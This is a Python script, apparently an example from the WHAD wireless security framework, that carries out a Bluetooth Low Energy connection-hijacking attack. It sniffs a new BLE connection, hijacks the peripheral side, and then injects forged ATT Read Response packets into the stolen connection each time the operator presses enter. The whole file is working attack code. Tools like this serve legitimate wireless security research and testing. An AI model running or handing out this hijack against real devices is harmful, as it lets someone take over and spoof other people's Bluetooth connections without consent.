from whad.ble import Sniffer, Hijacker, Central, Peripheral
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from time import time,sleep
from whad.ble.profile import UUID
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Read_Response
import sys
from whad.cli.ui import info, success, error

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        try:
            # Create the device
            dev = WhadDevice.create(interface)

            # Wait for a new connection
            sniffer = Sniffer(dev)
            connection = sniffer.wait_new_connection()


            # A new connection has been sniffed and we are synchronized
            info("Press enter to hijack.")
            input()

            # Start the hijacking attack on master
            hijacker = Hijacker(dev, connection)
            attack_success = hijacker.hijack(master=False, slave=True)
            # if attack is successful, get Peripheral connectors
            if attack_success:
                success("Slave successfully hijacked !")
                peripheral = hijacker.peripheral

                if peripheral is not None:
                    # Transmit Read Response when an user input occurs
                    while True:
                        print("Press enter to send a read response.")
                        input()
                        peripheral.send_pdu(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Read_Response(value=b"ABCD"))


            else:
                error("Attack failed, exiting...")
                dev.close()

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
